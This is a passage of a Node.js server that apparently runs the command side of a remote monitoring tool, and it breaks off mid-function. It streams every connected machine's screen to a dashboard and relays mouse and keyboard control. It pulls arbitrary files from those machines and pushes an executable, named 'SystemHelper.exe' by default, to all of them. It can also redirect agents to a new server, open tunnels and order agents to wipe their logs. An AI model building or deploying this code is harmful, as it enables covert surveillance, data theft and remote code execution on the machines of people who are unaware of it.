const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const AUTH_USER = 'puneet';
const AUTH_PASS = 'puneet12';
const AUTH_TOKEN = crypto.createHash('sha256').update(AUTH_USER + ':' + AUTH_PASS).digest('hex');

// Store connected agents and dashboards
const agents = new Map();
const dashboards = new Set();
const agentHistory = [];

// Basic Auth middleware
function auth(req, res, next) {
  const authHeader = req.headers['authorization'];
  if (!authHeader) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Remote Monitor"');
    return res.status(401).send('Unauthorized');
  }
  const base64 = authHeader.split(' ')[1];
  const creds = Buffer.from(base64, 'base64').toString().split(':');
  const user = creds[0], pass = creds[1];
  if (user !== AUTH_USER || pass !== AUTH_PASS) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Remote Monitor"');
    return res.status(401).send('Unauthorized');
  }
  next();
}

function wsAuth(req) {
  // Check token in URL
  const url = new URL(req.url, 'http://localhost');
  if (url.searchParams.get('token') === AUTH_TOKEN) return true;
  
  // Check Basic Auth from upgrade request
  const authHeader = req.headers['authorization'];
  if (authHeader) {
    const base64 = authHeader.split(' ')[1];
    const creds = Buffer.from(base64, 'base64').toString().split(':');
    if (creds[0] === AUTH_USER && creds[1] === AUTH_PASS) return true;
  }
  return false;
}

// Serve dashboard with auth token injected into WebSocket URL
app.get('/', auth, (req, res) => {
  try {
    const html = require('fs').readFileSync(__dirname + '/dashboard.html', 'utf8');
    res.send(html.replace(/TOKEN_PLACEHOLDER/g, AUTH_TOKEN));
  } catch (e) {
    res.status(500).send('Dashboard load error: ' + e.message);
  }
});

// Remote session page (no install, browser-based screen sharing)
app.get('/remote-session', auth, (req, res) => {
  res.send(`<!DOCTYPE html><html><body style="margin:0;background:#0f0f23;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column">
<h1 style="color:#7c7cf0">Remote Assistance</h1>
<p style="color:#888;margin:10px 0">You are about to share YOUR screen with the support person.</p>
<button onclick="start()" style="background:#7c7cf0;color:#fff;border:none;padding:15px 30px;border-radius:8px;font-size:18px;cursor:pointer">Share My Screen</button>
<div id="status" style="margin-top:20px;color:#555"></div>
<video id="preview" style="max-width:90%;max-height:60vh;margin-top:20px;display:none" autoplay></video>
<script>
const TOKEN='${AUTH_TOKEN}';
const WS_URL=(location.protocol=='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token='+TOKEN;
let ws,media;

function start(){
 document.getElementById('status').textContent='Requesting screen...';
 navigator.mediaDevices.getDisplayMedia({video:{cursor:'always'},audio:false}).then(s=>{
  media=s;
  document.getElementById('preview').srcObject=s;
  document.getElementById('preview').style.display='block';
  document.getElementById('status').textContent='Connected. You can close this tab when done.';
  
  ws=new WebSocket(WS_URL);
  ws.onopen=()=>{
   const sessionId='session-'+Math.random().toString(36).slice(2,8);
   window.sessionId=sessionId;
   ws.send(JSON.stringify({type:'agent-hello',agentId:sessionId,name:'🖥 Remote Session'}));
  };
  
  // Capture and send frames
  const canvas=document.createElement('canvas');
  const ctx=canvas.getContext('2d');
  const video=document.getElementById('preview');
  
  function sendFrame(){
   if(ws.readyState!==WebSocket.OPEN) return;
   canvas.width=video.videoWidth;canvas.height=video.videoHeight;
   ctx.drawImage(video,0,0);
   canvas.toBlob(b=>{
    const reader=new FileReader();
    reader.onload=()=>ws.send(JSON.stringify({type:'agent-frame',agentId:window.sessionId,frame:reader.result.split(',')[1]}));
    reader.readAsDataURL(b);
   },'image/jpeg',50);
   setTimeout(sendFrame,200);
  }
  
  video.onplay=sendFrame;
  s.getVideoTracks()[0].onended=()=>{ws.close();document.getElementById('status').textContent='Screen sharing ended.'};
 }).catch(e=>{document.getElementById('status').textContent='Error: '+e.message});
}
</script></body></html>`);
});

const MAX_UPLOAD_SIZE = 100 * 1024 * 1024;
const MAX_FILE_SIZE = 50 * 1024 * 1024;
const SAFE_PATH_REGEX = /^[a-zA-Z0-9_\-./\\: ]+$/;

function sanitizeFilename(name) {
  if (!name || typeof name !== 'string') return 'unnamed_file';
  const base = name.split(/[\\/]/).pop() || 'unnamed_file';
  return base.replace(/[^a-zA-Z0-9._\-() ]/g, '_').slice(0, 255) || 'unnamed_file';
}

function isValidAgentId(id) {
  return id && typeof id === 'string' && id.length > 0 && id.length <= 128 &&
    /^[a-zA-Z0-9_\-.:@]+$/.test(id);
}

// Full-screen single agent view
app.get('/view/:agentId', auth, (req, res) => {
  const agentId = req.params.agentId;
  if (!isValidAgentId(agentId)) return res.status(400).send('Invalid agent ID');
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>View: ${agentId}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;cursor:crosshair}
#screen{max-width:100vw;max-height:100vh;object-fit:contain}
#info{position:fixed;top:10px;left:10px;background:rgba(0,0,0,0.7);color:#fff;padding:6px 12px;border-radius:4px;font-size:12px;font-family:monospace;z-index:10}
#fps{position:fixed;top:10px;right:10px;background:rgba(0,0,0,0.7);color:#4caf50;padding:6px 12px;border-radius:4px;font-size:12px;font-family:monospace;z-index:10}
#credit{position:fixed;bottom:10px;right:10px;background:rgba(0,0,0,0.7);color:#fff;padding:6px 12px;border-radius:4px;font-size:11px;z-index:10}
</style></head><body>
<div id="info">${agentId}</div>
<div id="fps">0 FPS</div>
<img id="screen" src="" alt="">
<div id="credit">Created by Puneet Upreti</div>
<script>
const wsProto=location.protocol==='https:'?'wss:':'ws:';
const ws=new WebSocket(wsProto+'//'+location.host+'?token=TOKEN_PLACEHOLDER');
let fps=0,fpsTimer=setInterval(()=>{document.getElementById('fps').textContent=fps+' FPS';fps=0},1000);
const screen=document.getElementById('screen');
ws.onmessage=e=>{
  const d=JSON.parse(e.data);
  if(d.type==='frame'&&d.agentId==='${agentId}'){screen.src='data:image/jpeg;base64,'+d.frame;fps++;}
};
screen.addEventListener('mousemove',e=>{
  const r=screen.getBoundingClientRect();
  const x=((e.clientX-r.left)/r.width*100).toFixed(2);
  const y=((e.clientY-r.top)/r.height*100).toFixed(2);
  ws.send(JSON.stringify({type:'control',agentId:'${agentId}',command:'mousemove',params:{x,y}}));
});
screen.addEventListener('click',e=>{
  const r=screen.getBoundingClientRect();
  const x=((e.clientX-r.left)/r.width*100).toFixed(2);
  const y=((e.clientY-r.top)/r.height*100).toFixed(2);
  ws.send(JSON.stringify({type:'control',agentId:'${agentId}',command:'click',params:{x,y,button:0}}));
});
screen.addEventListener('contextmenu',e=>{
  e.preventDefault();
  const r=screen.getBoundingClientRect();
  const x=((e.clientX-r.left)/r.width*100).toFixed(2);
  const y=((e.clientY-r.top)/r.height*100).toFixed(2);
  ws.send(JSON.stringify({type:'control',agentId:'${agentId}',command:'click',params:{x,y,button:2}}));
});
document.addEventListener('keydown',e=>{
  ws.send(JSON.stringify({type:'control',agentId:'${agentId}',command:'keypress',params:{key:e.key,code:e.code}}));
});
</script></body></html>`);
});

app.post('/api/upload-update', (req, res) => {
  if (!checkAuthSimple(req)) {
    return res.status(401).send('Unauthorized');
  }
  
  const contentLen = parseInt(req.headers['content-length'] || '0');
  if (isNaN(contentLen) || contentLen > MAX_UPLOAD_SIZE) {
    return res.status(413).json({error: 'File too large'});
  }
  
  const filename = sanitizeFilename(req.headers['x-filename']) || 'SystemHelper.exe';
  let data = '';
  let aborted = false;
  
  req.on('error', err => {
    aborted = true;
    console.error('Upload error:', err.message);
  });
  
  req.setEncoding('base64');
  req.on('data', chunk => {
    if (aborted) return;
    data += chunk;
    if (Buffer.byteLength(data, 'base64') > MAX_UPLOAD_SIZE) {
      aborted = true;
      req.destroy();
      res.status(413).json({error: 'File too large'});
    }
  });
  req.on('end', () => {
    if (aborted) return;
    let count = 0;
    for (const [, agent] of agents) {
      if (agent.ws && agent.ws.readyState === WebSocket.OPEN) {
        try {
          agent.ws.send(JSON.stringify({type: 'push-update', frame: data, command: filename}));
          count++;
        } catch (e) {
          console.error(`Push to agent failed: ${e.message}`);
        }
      }
    }
    res.json({success: true, pushedTo: count, filename});
    console.log(`Update pushed to ${count} agents: ${filename}`);
  });
});

function checkAuthSimple(req) {
  const h = req.headers['authorization'];
  if (!h) return false;
  const c = Buffer.from(h.split(' ')[1], 'base64').toString().split(':');
  return c[0] === AUTH_USER && c[1] === AUTH_PASS;
}

app.post('/api/send-file/:agentId', (req, res) => {
  if (!checkAuthSimple(req)) return res.status(401).send('Unauthorized');
  
  const agentId = req.params.agentId;
  if (!isValidAgentId(agentId)) {
    return res.status(400).json({error: 'Invalid agent ID'});
  }
  
  const filename = sanitizeFilename(req.headers['x-filename']) || 'file';
  const agent = agents.get(agentId);
  
  if (!agent || !agent.ws || agent.ws.readyState !== WebSocket.OPEN) {
    return res.status(404).json({error: 'Agent not connected'});
  }
  
  let data = '';
  let aborted = false;
  
  req.on('error', err => {
    aborted = true;
    console.error('Send-file error:', err.message);
  });
  
  req.setEncoding('base64');
  req.on('data', chunk => {
    if (aborted) return;
    data += chunk;
    if (Buffer.byteLength(data, 'base64') > MAX_FILE_SIZE) {
      aborted = true;
      req.destroy();
      return res.status(413).json({error: 'File too large'});
    }
  });
  req.on('end', () => {
    if (aborted) return;
    try {
      agent.ws.send(JSON.stringify({type: 'file-transfer', command: filename, frame: data}));
    } catch (e) {
      return res.status(500).json({error: 'Failed to send file'});
    }
    res.json({success: true, filename, sentTo: agentId});
    console.log(`File sent to ${agentId}: ${filename}`);
  });
});
app.post('/api/switch-server', (req, res) => {
  if (!checkAuthSimple(req)) return res.status(401).send('Unauthorized');
  
  const newUrl = req.headers['x-server-url'];
  if (!newUrl) return res.status(400).json({error: 'Missing x-server-url header'});
  if (typeof newUrl !== 'string' || (!newUrl.startsWith('ws://') && !newUrl.startsWith('wss://'))) {
    return res.status(400).json({error: 'Invalid server URL. Must start with ws:// or wss://'});
  }
  if (newUrl.length > 500) {
    return res.status(400).json({error: 'Server URL too long'});
  }
  
  let count = 0;
  for (const [, agent] of agents) {
    if (agent.ws && agent.ws.readyState === WebSocket.OPEN) {
      try {
        agent.ws.send(JSON.stringify({type: 'switch-server', command: newUrl}));
        count++;
      } catch (e) {
        console.error(`Switch-server send failed: ${e.message}`);
      }
    }
  }
  console.log(`Switch-server sent to ${count} agents: ${newUrl}`);
  res.json({success: true, agentsNotified: count, newUrl});
});

app.post('/api/make-server/:agentId', auth, (req, res) => {
  const agentId = req.params.agentId;
  if (!isValidAgentId(agentId)) {
    return res.status(400).json({error: 'Invalid agent ID'});
  }
  const agentEntry = agents.get(agentId);
  if (!agentEntry || !agentEntry.ws || agentEntry.ws.readyState !== WebSocket.OPEN) {
    return res.status(404).json({error: 'Agent not connected'});
  }
  try {
    agentEntry.ws.send(JSON.stringify({type: 'become-server'}));
  } catch (e) {
    return res.status(500).json({error: 'Failed to send command'});
  }
  console.log(`Server mode activated for: ${agentId}`);
  res.json({success: true, agent: agentId, message: 'Server mode activated — tunnel starting...'});
});

app.post('/api/tunnel/:agentId', auth, (req, res) => {
  const agentId = req.params.agentId;
  if (!isValidAgentId(agentId)) {
    return res.status(400).json({error: 'Invalid agent ID'});
  }
  const agentEntry = agents.get(agentId);
  if (!agentEntry || !agentEntry.ws || agentEntry.ws.readyState !== WebSocket.OPEN) {
    return res.status(404).json({error: 'Agent not connected'});
  }
  try {
    agentEntry.ws.send(JSON.stringify({type: 'start-tunnel', command: 'serveo'}));
  } catch (e) {
    return res.status(500).json({error: 'Failed to send command'});
  }
  console.log(`Tunnel requested for: ${agentId}`);
  res.json({success: true, agent: agentId, message: 'Tunnel starting...'});
});

// No static serve needed — dashboard served via app.get('/')

// Report endpoint
app.get('/api/report', auth, (req, res) => {
  const format = req.query.format || 'json';
  const report = [];
  for (const [id, agent] of agents) {
    report.push({
      name: agent.name, id, ip: agent.ip, status: 'online',
      connectedFor: Math.floor((Date.now() - agent.connectedAt) / 1000),
      framesReceived: agent.framesReceived || 0, events: agent.events,
      bootTime: agent.bootTime || '',
      programStart: agent.programStart || '',
      totalIdle: agent.totalIdle || 0,
      totalActive: agent.totalActive || 0,
      currentState: agent.currentState || 'active',
      currentIdle: agent.currentIdle || 0,
      uptime: agent.uptime || 0,
      version: agent.version || '',
      lastStatusUpdate: agent.lastStatusUpdate || null
    });
  }
  if (format === 'csv') {
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=agent-report.csv');
    res.write('Date,Name,ID,IP,Status,Connected (s),Frames,BootTime,ProgramStart,TotalActive(s),TotalIdle(s),CurrentState,Uptime(min),Version\n');
    for (const a of report) {
      res.write(`"${new Date().toISOString().slice(0,10)}","${a.name}","${a.id}","${a.ip}",${a.status},${a.connectedFor},${a.framesReceived},"${a.bootTime}","${a.programStart}",${a.totalActive},${a.totalIdle},${a.currentState},${a.uptime},"${a.version}"\n`);
    }
    for (const h of agentHistory) {
      const dur = Math.floor((h.disconnectedAt - h.connectedAt) / 1000);
      res.write(`"${new Date(h.connectedAt).toISOString().slice(0,10)}","${h.name}","${h.id}","${h.ip}",offline,${dur},${h.framesReceived},"${h.bootTime||''}","${h.programStart||''}",${h.totalActive||0},${h.totalIdle||0},${h.currentState||'unknown'},${h.uptime||0},"${h.version||''}"\n`);
    }
    res.end();
  } else if (format === 'html') {
    // Format seconds to human-readable
    function fmtTime(sec) {
      if (!sec || sec < 0) return '0s';
      if (sec < 60) return sec+'s';
      if (sec < 3600) return Math.floor(sec/60)+'m '+(sec%60)+'s';
      return Math.floor(sec/3600)+'h '+Math.floor((sec%3600)/60)+'m';
    }
    function fmtDt(d) { return d ? new Date(d).toLocaleString() : 'N/A'; }
    let html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Agent Report</title>';
    html += '<style>body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;color:#1a1a2e;margin:0;padding:20px}';
    html += 'h1{font-size:18px;color:#2563eb;margin-bottom:20px}';
    html += '.card{background:#fff;border-radius:8px;padding:15px;margin-bottom:15px;box-shadow:0 1px 3px rgba(0,0,0,.08)}';
    html += '.card h2{font-size:14px;margin:0 0 10px;color:#1a1a2e}';
    html += '.card .row{display:flex;flex-wrap:wrap;gap:10px;font-size:12px}';
    html += '.card .row .field{min-width:140px;padding:6px 10px;background:#f8f9fb;border-radius:4px}';
    html += '.card .row .field .label{color:#94a3b8;font-size:10px}';
    html += '.card .row .field .val{font-weight:600;margin-top:2px}';
    html += '.status-online{color:#16a34a}.status-idle{color:#ea580c}.status-offline{color:#94a3b8}';
    html += '.bar{border-radius:4px;overflow:hidden;margin:5px 0;height:16px;display:flex}';
    html += '.bar .active-bar{background:#2563eb;height:100%}';
    html += '.bar .idle-bar{background:#ea580c;height:100%}';
    html += '</style></head><body><h1>Agent Activity Report</h1>';
    
    // Online agents
    html += '<h2 style="font-size:14px;margin-bottom:10px;color:#16a34a">Online ('+report.length+')</h2>';
    for (const a of report) {
      const total = a.totalActive + a.totalIdle;
      const activePct = total > 0 ? Math.round(a.totalActive/total*100) : 0;
      const idlePct = total > 0 ? Math.round(a.totalIdle/total*100) : 0;
      const stateClass = a.currentState === 'idle' ? 'status-idle' : 'status-online';
      html += '<div class="card"><h2>'+a.name+' <span class="'+stateClass+'">('+a.currentState+')</span></h2>';
      html += '<div class="row">';
      html += '<div class="field"><div class="label">IP</div><div class="val">'+a.ip+'</div></div>';
      html += '<div class="field"><div class="label">Status</div><div class="val status-online">Online</div></div>';
      html += '<div class="field"><div class="label">Connected</div><div class="val">'+fmtTime(a.connectedFor)+'</div></div>';
      html += '<div class="field"><div class="label">Frames</div><div class="val">'+a.framesReceived+'</div></div>';
      html += '<div class="field"><div class="label">Uptime</div><div class="val">'+fmtTime(a.uptime*60)+'</div></div>';
      html += '<div class="field"><div class="label">Version</div><div class="val">'+a.version+'</div></div>';
      html += '<div class="field"><div class="label">Boot Time</div><div class="val">'+fmtDt(a.bootTime)+'</div></div>';
      html += '<div class="field"><div class="label">Program Start</div><div class="val">'+fmtDt(a.programStart)+'</div></div>';
      html += '<div class="field"><div class="label">Active Time</div><div class="val">'+fmtTime(a.totalActive)+'</div></div>';
      html += '<div class="field"><div class="label">Idle Time</div><div class="val">'+fmtTime(a.totalIdle)+'</div></div>';
      if (a.currentState === 'idle') {
        html += '<div class="field"><div class="label">Current Idle</div><div class="val status-idle">'+fmtTime(a.currentIdle)+'</div></div>';
      }
      html += '</div>';
      if (total > 0) {
        html += '<div class="bar"><div class="active-bar" style="width:'+activePct+'%"></div><div class="idle-bar" style="width:'+idlePct+'%"></div></div>';
        html += '<div style="font-size:10px;color:#94a3b8;margin-top:3px"><span style="color:#2563eb">Active: '+fmtTime(a.totalActive)+'</span> &nbsp; <span style="color:#ea580c">Idle: '+fmtTime(a.totalIdle)+'</span></div>';
      }
      // Show events
      if (a.events && a.events.length) {
        html += '<div style="font-size:11px;margin-top:8px;border-top:1px solid #e8eaee;padding-top:6px">';
        const recentEvents = a.events.slice(-10).reverse();
        for (const ev of recentEvents) {
          html += '<div style="color:#64748b;padding:2px 0">['+new Date(ev.time).toLocaleTimeString()+'] '+ev.type+'</div>';
        }
        html += '</div>';
      }
      html += '</div>';
    }
    
    // History (offline agents)
    const history = agentHistory.map(h => ({
      name: h.name, id: h.id, ip: h.ip, status: 'offline',
      date: new Date(h.connectedAt).toISOString().slice(0,10),
      connectedFor: Math.floor((h.disconnectedAt - h.connectedAt) / 1000),
      framesReceived: h.framesReceived, events: h.events,
      bootTime: h.bootTime || '',
      programStart: h.programStart || '',
      totalIdle: h.totalIdle || 0,
      totalActive: h.totalActive || 0
    }));
    if (history.length) {
      html += '<h2 style="font-size:14px;margin:20px 0 10px;color:#94a3b8">Offline History ('+history.length+')</h2>';
      for (const h of history) {
        const total = h.totalActive + h.totalIdle;
        const activePct = total > 0 ? Math.round(h.totalActive/total*100) : 0;
        html += '<div class="card"><h2>'+h.name+' <span class="status-offline">(offline)</span></h2>';
        html += '<div class="row">';
        html += '<div class="field"><div class="label">IP</div><div class="val">'+h.ip+'</div></div>';
        html += '<div class="field"><div class="label">Session</div><div class="val">'+fmtTime(h.connectedFor)+'</div></div>';
        html += '<div class="field"><div class="label">Date</div><div class="val">'+h.date+'</div></div>';
        html += '<div class="field"><div class="label">Frames</div><div class="val">'+h.framesReceived+'</div></div>';
        html += '<div class="field"><div class="label">Boot Time</div><div class="val">'+fmtDt(h.bootTime)+'</div></div>';
        html += '<div class="field"><div class="label">Program Start</div><div class="val">'+fmtDt(h.programStart)+'</div></div>';
        html += '<div class="field"><div class="label">Active</div><div class="val">'+fmtTime(h.totalActive)+'</div></div>';
        html += '<div class="field"><div class="label">Idle</div><div class="val">'+fmtTime(h.totalIdle)+'</div></div>';
        html += '</div>';
        if (total > 0) {
          html += '<div class="bar"><div class="active-bar" style="width:'+activePct+'%"></div><div class="idle-bar" style="width:'+(100-activePct)+'%"></div></div>';
        }
        html += '</div>';
      }
    }
    
    html += '<p style="font-size:10px;color:#94a3b8;margin-top:20px">Generated: '+new Date().toLocaleString()+'</p></body></html>';
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } else {
    const history = agentHistory.map(h => ({
      name: h.name, id: h.id, ip: h.ip, status: 'offline',
      date: new Date(h.connectedAt).toISOString().slice(0,10),
      connectedFor: Math.floor((h.disconnectedAt - h.connectedAt) / 1000),
      framesReceived: h.framesReceived, events: h.events,
      bootTime: h.bootTime || '',
      programStart: h.programStart || '',
      totalIdle: h.totalIdle || 0,
      totalActive: h.totalActive || 0,
      currentState: h.currentState || 'offline',
      uptime: h.uptime || 0,
      version: h.version || ''
    }));
    res.json({online: report, history});
  }
});

// Cleanup command - clear all logs and history
app.post('/api/cleanup', auth, (req, res) => {
  // Clear server-side history
  const count = agentHistory.length;
  agentHistory.length = 0;
  
  // Tell all agents to clean their logs
  let notified = 0;
  for (const [id, agent] of agents) {
    if (agent.ws && agent.ws.readyState === WebSocket.OPEN) {
      agent.ws.send(JSON.stringify({type: 'cleanup-logs'}));
      notified++;
    }
  }
  
  console.log(`Cleanup: cleared ${count} history entries, notified ${notified} agents`);
  res.json({success: true, historyCleared: count, agentsNotified: notified});
});

app.get('/api/agents', auth, (req, res) => {
  const list = [];
  for (const [id, agent] of agents) {
    list.push({
      id,
      name: agent.name,
      connected: true,
      lastSeen: agent.lastSeen,
      viewers: agent.viewers.size,
      ip: agent.ip
    });
  }
  res.json(list);
});

// API endpoint to get latest frame of an agent
app.get('/api/frame/:agentId', auth, (req, res) => {
  const agent = agents.get(req.params.agentId);
  if (agent && agent.lastFrame) {
    res.json({ frame: agent.lastFrame });
  } else {
    res.status(404).json({ error: 'Agent not found or no frame' });
  }
});

wss.on('connection', (ws, req) => {
  if (!wsAuth(req)) { ws.close(4001, 'Unauthorized'); return; }
  
  ws.on('error', err => {
    console.error('WebSocket error:', err.message);
  });
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      
      switch (data.type) {
        // Agent registration
        case 'agent-hello':
          ws.role = 'agent';
          if (!data.agentId || !isValidAgentId(data.agentId)) {
            ws.send(JSON.stringify({type: 'error', message: 'Invalid agent ID'}));
            ws.close(4003, 'Invalid agent ID');
            return;
          }
          ws.agentId = data.agentId;
          ws.org = typeof data.org === 'string' ? data.org.slice(0, 100) : '';
          const clientIp = req.socket.remoteAddress?.replace(/^::ffff:/, '') || 'unknown';
          const helloData = data.data || {};
          const agentIP = helloData.agentIP || clientIp;
          const agentName = typeof data.name === 'string' ? data.name.replace(/[<>]/g, '').slice(0, 100) : 'Unknown';
          agents.set(data.agentId, {
            ws,
            name: agentName,
            org: ws.org,
            lastSeen: Date.now(),
            lastFrame: null,
            framesReceived: 0,
            viewers: new Set(),
            ip: agentIP,
            connectedAt: Date.now(),
            events: [{type: 'connected', time: Date.now()}],
            bootTime: helloData.bootTime || '',
            programStart: helloData.programStart || '',
            totalIdle: helloData.totalIdle || 0,
            totalActive: helloData.totalActive || 0,
            version: helloData.version || '',
            currentState: helloData.currentState || 'active',
            currentIdle: helloData.currentIdle || 0
          });
          console.log(`Agent connected: ${agentName} (${data.agentId}) from ${agentIP} (conn: ${clientIp})`);
          broadcastToDashboards({ type: 'agent-connected', agentId: data.agentId, name: agentName, ip: agentIP });
          for (const dWs of dashboards) {
            if (dWs.readyState === WebSocket.OPEN) {
              const a = agents.get(data.agentId);
              if (a) a.viewers.add(dWs);
            }
          }
          break;

        // Agent sends screen frame
        case 'agent-frame':
          const agent = agents.get(data.agentId);
          if (agent) {
            agent.lastFrame = data.frame;
            agent.lastSeen = Date.now();
            agent.framesReceived++;
            // Forward frame to all viewers of this agent
            for (const viewerWs of agent.viewers) {
              if (viewerWs.readyState === WebSocket.OPEN) {
                viewerWs.send(JSON.stringify({
                  type: 'frame',
                  agentId: data.agentId,
                  frame: data.frame,
                  display: data.display || 0
                }));
              }
            }
          }
          break;

        // Agent sends log
        case 'agent-log':
          console.log(`[Agent ${data.agentId}]: ${data.message}`);
          break;

        // Agent sends detailed status update
        case 'agent-status':
          const statusAgent = agents.get(data.agentId);
          if (statusAgent && data.data) {
            const sd = data.data;
            if (sd.bootTime) statusAgent.bootTime = sd.bootTime;
            if (sd.programStart) statusAgent.programStart = sd.programStart;
            if (sd.totalIdle !== undefined) statusAgent.totalIdle = sd.totalIdle;
            if (sd.totalActive !== undefined) statusAgent.totalActive = sd.totalActive;
            if (sd.currentState) statusAgent.currentState = sd.currentState;
            if (sd.currentIdle !== undefined) statusAgent.currentIdle = sd.currentIdle;
            if (sd.uptime !== undefined) statusAgent.uptime = sd.uptime;
            if (sd.version) statusAgent.version = sd.version;
            statusAgent.lastStatusUpdate = Date.now();
          }
          break;

        // Browser (dashboard) registers
        case 'dashboard-hello':
          ws.role = 'dashboard';
          ws._id = Math.random().toString(36).slice(2); // Unique viewer ID for WebRTC
          dashboards.add(ws);
          // Send current agent list with IPs and orgs
          const agentList = [];
          const orgList = new Set();
          for (const [id, a] of agents) {
            agentList.push({ id, name: a.name, viewers: a.viewers.size, ip: a.ip, org: a.org || '' });
            if (a.org) orgList.add(a.org);
            // Auto-add dashboard as viewer of every agent (CCTV wall mode)
            a.viewers.add(ws);
          }
          ws.send(JSON.stringify({ type: 'agent-list', agents: agentList, orgs: [...orgList] }));
          console.log('Dashboard connected (CCTV wall)');
          break;

        // Dashboard wants to view an agent
        case 'view-agent':
          if (ws.role === 'dashboard') {
            const targetAgent = agents.get(data.agentId);
            if (targetAgent) {
              targetAgent.viewers.add(ws);
              ws.viewingAgent = data.agentId;
              // Send current frame immediately
              if (targetAgent.lastFrame) {
                ws.send(JSON.stringify({
                  type: 'frame',
                  agentId: data.agentId,
                  frame: targetAgent.lastFrame
                }));
              }
              // Notify agent to increase frame rate
              targetAgent.ws.send(JSON.stringify({
                type: 'set-fps',
                fps: 10
              }));
              console.log(`Dashboard viewing: ${data.agentId}`);
            }
          }
          break;

        // Dashboard stops viewing an agent
        case 'stop-viewing':
          if (ws.role === 'dashboard') {
            const agentsToClean = data.agentId ? [data.agentId] : (ws.viewingAgent ? [ws.viewingAgent] : []);
            for (const aid of agentsToClean) {
              const prevAgent = agents.get(aid);
              if (prevAgent) {
                prevAgent.viewers.delete(ws);
                if (prevAgent.viewers.size === 0) {
                  prevAgent.ws.send(JSON.stringify({ type: 'set-fps', fps: 1 }));
                }
              }
            }
            ws.viewingAgent = null;
          }
          break;

        // Control command from dashboard
        case 'control':
          if (ws.role === 'dashboard' && data.agentId) {
            const targetAgent = agents.get(data.agentId);
            if (targetAgent) {
              targetAgent.ws.send(JSON.stringify({
                type: 'control',
                command: data.command,
                params: data.params
              }));
            }
          }
          break;

        // Dashboard requests a file from an agent
        case 'request-file':
          const targetAgent2 = agents.get(data.agentId);
          if (targetAgent2 && targetAgent2.ws && targetAgent2.ws.readyState === WebSocket.OPEN) {
            const reqPath = typeof data.command === 'string' ? data.command.slice(0, 1024) : '';
            if (!reqPath) {
              console.warn(`Empty file request from ${data.agentId}`);
              break;
            }
            try {
              targetAgent2.ws.send(JSON.stringify({ type: 'request-file', command: reqPath }));
              console.log(`File requested from ${data.agentId}: ${reqPath}`);
            } catch (e) {
              console.error(`File request send failed for ${data.agentId}: ${e.message}`);
            }
          }
          break;

        // Agent sends file response back
        case 'file-response':
          broadcastToDashboards({
            type: 'file-response',
            agentId: ws.agentId,
            command: data.command,
            frame: data.frame
          });
          console.log(`File response from ${ws.agentId}: ${data.command}`);
          break;

        // Dashboard requests to make an agent a server (tunnel)
        case 'become-server':
          if (ws.role === 'dashboard') {
            const targetAgent = agents.get(data.agentId);
            if (targetAgent && targetAgent.ws && targetAgent.ws.readyState === WebSocket.OPEN) {
              targetAgent.ws.send(JSON.stringify({ type: 'become-server' }));
              console.log(`Make server requested for: ${data.agentId}`);
            }
          }
          break;

        // Dashboard sends a file to an agent
        case 'file-transfer':
          if (ws.role === 'dashboard') {
            const targetAgent = agents.get(data.agentId);
            if (targetAgent && targetAgent.ws && targetAgent.ws.readyState === WebSocket.OPEN) {
              targetAgent.ws.send(JSON.stringify({
                type: 'file-transfer',
                command: data.command,
                frame: data.frame
              }));
              console.log(`File sent to ${data.agentId}: ${data.command}`);
            }
          }
          break;

        // Agent reports tunnel status
        case 'tunnel-status':
          broadcastToDashboards({
            type: 'tunnel-status',
            agentId: ws.agentId || data.agentId,
            command: data.command,
            frame: data.frame
          });
          break;

        // Push update to all agents
        case 'push-update':
          let pushedCount = 0;
          for (const [, a] of agents) {
            if (a.ws && a.ws.readyState === WebSocket.OPEN) {
              a.ws.send(JSON.stringify({ type: 'push-update', command: data.command, frame: data.frame }));
              pushedCount++;
            }
          }
          ws.send(JSON.stringify({ type: 'update-status', pushedTo: pushedCount }));
          console.log(`Update pushed to ${pushedCount} agents: ${data.command}`);
          break;

        // WebRTC Signaling
        case 'webrtc-offer':
          if (ws.role === 'dashboard') {
            const targetAgent = agents.get(data.target);
            if (targetAgent && targetAgent.ws && targetAgent.ws.readyState === WebSocket.OPEN) {
              targetAgent.ws.send(JSON.stringify({
                type: 'webrtc-offer',
                data: {
                  sdp: data.sdp,
                  viewer: ws._id
                }
              }));
            }
          }
          break;

        case 'webrtc-answer':
          if (ws.role === 'agent' && data.data && data.data.target) {
            const targetViewer = [...dashboards].find(d => d._id === data.data.target);
            if (targetViewer && targetViewer.readyState === WebSocket.OPEN) {
              targetViewer.send(JSON.stringify({
                type: 'webrtc-answer',
                agentId: ws.agentId,
                sdp: data.data.sdp
              }));
            }
          }
          break;

        case 'webrtc-ice-candidate':
          if (ws.role === 'dashboard') {
            const targetAgent = agents.get(data.target);
            if (targetAgent && targetAgent.ws && targetAgent.ws.readyState === WebSocket.OPEN) {
              targetAgent.ws.send(JSON.stringify({
                type: 'webrtc-ice-candidate',
                data: {
                  candidate: data.candidate,
                  viewer: ws._id
                }
              }));
            }
          } else if (ws.role === 'agent' && data.data && data.data.target) {
            const targetViewer = [...dashboards].find(d => d._id === data.data.target);
            if (targetViewer && targetViewer.readyState === WebSocket.OPEN) {
              targetViewer.send(JSON.stringify({
                type: 'webrtc-ice-candidate',
                agentId: ws.agentId,
                candidate: data.data.candidate
              }));
            }
          }
          break;

        default:
          console.log('Unknown message type:', data.type);
      }
    } catch (err) {
      console.error('Error processing message:', err);
    }
  });

  ws.on('close', () => {
    if (ws.role === 'agent' && ws.agentId) {
      // Only remove if this websocket is still the registered one for this agent
      // (prevents race condition when agent reconnects quickly)
      const agent = agents.get(ws.agentId);
      if (agent && agent.ws === ws) {
        agent.events.push({type: 'disconnected', time: Date.now()});
        // Save to history
        if (typeof agentHistory !== 'undefined') {
          agentHistory.push({
